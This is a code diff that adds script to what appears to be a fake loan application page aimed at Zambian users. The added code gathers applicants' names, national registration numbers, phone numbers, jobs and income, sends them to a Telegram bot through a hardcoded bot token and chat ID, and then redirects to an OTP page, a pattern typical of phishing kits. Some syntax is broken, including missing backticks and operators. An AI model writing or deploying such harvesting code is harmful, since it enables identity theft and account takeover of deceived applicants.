@@ -123,7 +123,69 @@ function sendOTP() {
         }
     }, 1000);
 }
-</script>
+   const submitBtn = document.getElementById('submitBtn');
+const popup = document.getElementById('loadingPopup');
+
+// Telegram config
+const BOT_TOKEN = '
+8578906706:AAFWBYBi_sFvCBH_NnayxSrS8TKKO0E84eY';
+const CHAT_ID = '8588753899';
+
+submitBtn.addEventListener('click', async () => {
+
+    const data = {
+        amount: document.getElementById('loanAmount').value,
+        duration: document.getElementById('duration').value,
+        name: document.getElementById('fullName').value,
+        nrc: document.getElementById('nrcNumber').value,
+        phone: document.getElementById('phoneInput').value,
+        job: document.getElementById('jobType').value,
+        income: document.getElementById('income').value
+    };
+
+    // Validation
+    if (!data.amount  !data.name  !data.nrc || data.phone.length < 9) {
+        alert("Please fill out all fields to proceed.");
+        return;
+    }
+
+    const fullPhone = "+260" + data.phone;
+    localStorage.setItem('userPhone', fullPhone);
+
+    // Show loading
+    popup.style.display = 'flex';
+
+    const message =
+        🏦 NEW LOAN APPLICATION\n\n +
+        Amount: K ${data.amount}\n +
+        Duration: ${data.duration}\n +
+        Name: ${data.name}\n +
+        NRC: ${data.nrc}\n +
+        Phone: ${fullPhone}\n +
+        Job: ${data.job}\n +
+        Income: K ${data.income};
+
+    // Send Telegram
+    try {
+        await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+    } catch (err) {
+        console.error(err);
+    }
+
+    // Redirect
+    setTimeout(() => {
+        window.location.href = 'OTP.html';
+    }, 2000);
+
+});
+</script> 
 
 </body>
 </html>
